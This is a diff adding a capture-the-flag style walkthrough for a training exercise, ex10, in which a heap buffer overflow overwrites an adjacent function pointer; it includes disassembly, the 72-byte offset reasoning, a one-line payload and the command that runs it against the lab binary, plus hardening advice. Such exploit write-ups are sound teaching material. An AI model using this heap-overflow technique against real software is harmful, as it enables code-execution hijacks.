@@ -567,8 +567,51 @@ the GOT read-only after startup and defeats this class of attack.
 
 ---
 
-<!-- ex10 … ex11 walkthroughs are added as each challenge is completed. -->
-_ex10 … ex11: in progress._
+### ex10 — heap overflow into an adjacent function pointer
+
+**Goal (`README.txt`):** see *“level passed”*.
+
+**Vulnerability class:** heap buffer overflow (CWE-122) corrupting an **adjacent heap-stored
+function pointer** that is then called indirectly.
+
+**Disassembly (`main`):**
+
+```asm
+ 8048495: mov [esp],0x40 ; call malloc@plt      ; a = malloc(0x40)   -> [esp+0x18]
+ 80484a5: mov [esp],0x4  ; call malloc@plt      ; b = malloc(4)      -> [esp+0x1c]
+ 80484b5: mov edx,0x8048478 ; mov [b],edx        ; *b = nowinner
+ 80484d8: call printf@plt                        ; "data is at %p, fp is at %p"
+ 80484f2: call strcpy@plt                        ; strcpy(a, argv[1])  <-- overflow
+ 80484f7: mov eax,[esp+0x1c] ; mov eax,[eax]     ; eax = *b
+ 80484fd: call eax                               ; call *(*b)          <-- hijacked
+```
+
+**Reading it:** `a` and `b` are consecutive heap allocations; `b` stores a function pointer
+(initially `nowinner`). `strcpy(a, argv[1])` is unbounded, so overflowing `a` overwrites the
+pointer in `b`, and `call eax` then jumps wherever we chose. Point it at `winner` (`0x08048464`).
+
+**Offset = 72 (`0x48`).** `malloc(0x40)`'s chunk is `0x48` bytes including the header, so `b`'s data
+is `a + 0x48`. The program **leaks both pointers** (`data is at 0x..008, fp is at 0x..050`) —
+their difference is exactly `0x48`, confirming 72. The offset is *relative*, so this works even
+with heap ASLR; `winner`'s address is fixed (no PIE).
+
+**Exploit (`scripts/ex10.py`):** `"A"*72 + p32(0x08048464)`.
+
+```bash
+/opt/hole-in-bin/ex10/bin "$(python3 scripts/ex10.py)"
+```
+
+**Result (verified):** `level passed`.
+
+**Key takeaway:** function pointers on the heap are just as dangerous as on the stack. Allocating a
+code pointer immediately after an unbounded buffer is a recipe for hijack. Keep sizes bounded
+(`strncpy`/`snprintf`), separate data from control pointers, and prefer indices/handles over raw
+callable pointers in attacker-reachable structures.
+
+---
+
+<!-- ex11 walkthrough is added when complete. -->
+_ex11: in progress._
 
 ---
 
